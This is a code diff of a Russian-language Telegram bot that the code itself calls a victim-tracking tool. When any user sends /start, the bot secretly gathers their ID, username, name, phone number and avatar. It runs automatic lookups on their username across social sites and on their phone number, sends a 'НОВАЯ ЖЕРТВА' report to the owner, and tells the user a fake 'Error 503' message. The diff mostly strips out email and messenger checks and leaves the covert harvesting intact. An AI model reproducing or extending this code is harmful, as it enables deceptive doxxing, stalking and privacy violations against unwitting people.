@@ -19,16 +19,13 @@ if os.path.exists("victims.json"):
         victims = json.load(f)
 
 def search_by_username(username):
-    """Поиск профилей в соцсетях по юзернейму"""
     results = {}
     sites = {
         "Instagram": f"https://www.instagram.com/{username}/",
         "Twitter": f"https://twitter.com/{username}",
         "GitHub": f"https://github.com/{username}",
         "TikTok": f"https://www.tiktok.com/@{username}",
-        "VK": f"https://vk.com/{username}",
-        "YouTube": f"https://youtube.com/@{username}",
-        "Reddit": f"https://reddit.com/user/{username}"
+        "VK": f"https://vk.com/{username}"
     }
     for name, url in sites.items():
         try:
@@ -40,13 +37,10 @@ def search_by_username(username):
     return results
 
 def search_by_phone(phone):
-    """Поиск информации по номеру телефона"""
     results = {}
     phone_clean = re.sub(r"\D", "", phone)
     if len(phone_clean) == 11 and phone_clean.startswith("8"):
         phone_clean = "7" + phone_clean[1:]
-    
-    # Оператор и регион
     try:
         r = requests.get(f"https://htmlweb.ru/geo/api.php?json&tel={phone_clean}", timeout=5)
         if r.status_code == 200:
@@ -55,49 +49,9 @@ def search_by_phone(phone):
             results["region"] = data.get("region", {}).get("name")
     except:
         pass
-    
-    # Проверка WhatsApp
-    try:
-        r = requests.get(f"https://api.whatsapp.com/phone/{phone_clean}", timeout=5)
-        results["whatsapp"] = "есть" if r.status_code == 200 else "нет"
-    except:
-        results["whatsapp"] = "ошибка"
-    
-    # Проверка Telegram (через API)
-    try:
-        r = requests.get(f"https://t.me/{phone_clean}", timeout=5)
-        results["telegram"] = "есть" if r.status_code == 200 else "нет"
-    except:
-        pass
-    
     return results
 
-def search_by_email(email):
-    """Поиск по email"""
-    results = {}
-    try:
-        # Gravatar
-        import hashlib
-        hash_md5 = hashlib.md5(email.lower().encode()).hexdigest()
-        r = requests.get(f"https://www.gravatar.com/{hash_md5}.json", timeout=5)
-        if r.status_code == 200:
-            results["gravatar"] = r.json().get("entry", [{}])[0].get("displayName")
-    except:
-        pass
-    
-    # Проверка утечек (бесплатный API)
-    try:
-        r = requests.get(f"https://leak-lookup.com/api/search", timeout=5)
-        # Требуется API ключ
-    except:
-        pass
-    
-    return results
-
-def save_victim(user, osint_data=None):
-    if osint_data is None:
-        osint_data = {}
-    
+def save_victim(user, osint_data):
     data = {
         "id": user.id,
         "username": user.username,
@@ -114,61 +68,41 @@ def save_victim(user, osint_data=None):
 @client.on(events.NewMessage(pattern='/start'))
 async def handler(event):
     user = await event.get_sender()
-    msg_text = event.raw_text
     
-    # Владелец
+    # Если это владелец
     if user.id == OWNER_ID:
-        await event.reply(
-            "✅ **БОТ АКТИВЕН**\n\n"
-            "📌 **Команды:**\n"
-            "/stats - статистика\n"
-            "/list - список жертв\n"
-            "/search @username - пробив юзернейма\n"
-            "/search +79991234567 - пробив номера\n"
-            "/search email@example.com - пробив email\n\n"
-            "📌 **Пробив жертвы:**\n"
-            "Жертва пишет /start - получает данные\n"
-            "Жертва пишет /start @username - пробив по юзернейму"
-        )
+        await event.reply("✅ БОТ АКТИВЕН\n\n/stats - статистика\n/list - список\n/search @username - пробив\n/search +79991234567 - пробив номера")
         return
     
-    # Пробив по параметру
+    # Автоматический пробив жертвы
     osint_data = {}
-    query = None
     
-    if msg_text.startswith("/start "):
-        query = msg_text[7:].strip()
-    elif msg_text.startswith("/search "):
-        query = msg_text[8:].strip()
+    # Пробив по username если есть
+    if user.username:
+        osint_data["social"] = search_by_username(user.username)
     
-    if query:
-        if query.startswith("+"):
-            osint_data["phone"] = search_by_phone(query)
-        elif "@" in query and "." in query:
-            osint_data["email"] = search_by_email(query)
-        else:
-            username = query[1:] if query.startswith("@") else query
-            osint_data["social"] = search_by_username(username)
+    # Пробив по номеру если есть
+    if user.phone:
+        osint_data["phone_info"] = search_by_phone(user.phone)
     
     save_victim(user, osint_data)
     
-    # Формирование отчета
+    # Отчет владельцу
     report = f"""【НОВАЯ ЖЕРТВА】
-━━━━━━━━━━━━━━━━━━━━━
 ID: {user.id}
 Username: @{user.username}
 Имя: {user.first_name} {user.last_name}
 Телефон: {getattr(user, 'phone', 'Скрыт')}
 Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}
-━━━━━━━━━━━━━━━━━━━━━
-Ссылка: tg://user?id={user.id}"""
 
-    if osint_data:
-        report += f"\n\n【OSINT ПРОБИВ】\n{json.dumps(osint_data, indent=2, ensure_ascii=False)}"
+【OSINT ПРОБИВ】
+{json.dumps(osint_data, indent=2, ensure_ascii=False)}
+
+Ссылка: tg://user?id={user.id}"""
     
     await client.send_message(OWNER_ID, report)
     
-    # Аватар
+    # Аватар владельцу
     try:
         photos = await client.get_profile_photos(user.id, limit=1)
         if photos:
@@ -176,8 +110,8 @@ Username: @{user.username}
     except:
         pass
     
-    # Заглушка
-    await event.reply("⚠️ Ошибка 503. Сервис временно недоступен.")
+    # Заглушка жертве
+    await event.reply("⚠️ Ошибка 503. Сервис временно недоступен. Попробуйте позже.")
 
 @client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
 async def stats(event):
@@ -188,7 +122,7 @@ async def list_cmd(event):
     if not victims:
         await event.reply("Список пуст")
         return
-    text = "📋 Последние жертвы:\n\n"
+    text = "📋 Жертвы:\n\n"
     for v in victims[-10:]:
         text += f"• {v['first_name']} @{v['username']}\n  {v['time']}\n\n"
     await event.reply(text)
@@ -199,8 +133,6 @@ async def search_cmd(event):
     
     if query.startswith("+"):
         result = search_by_phone(query)
-    elif "@" in query and "." in query:
-        result = search_by_email(query)
     else:
         username = query[1:] if query.startswith("@") else query
         result = search_by_username(username)
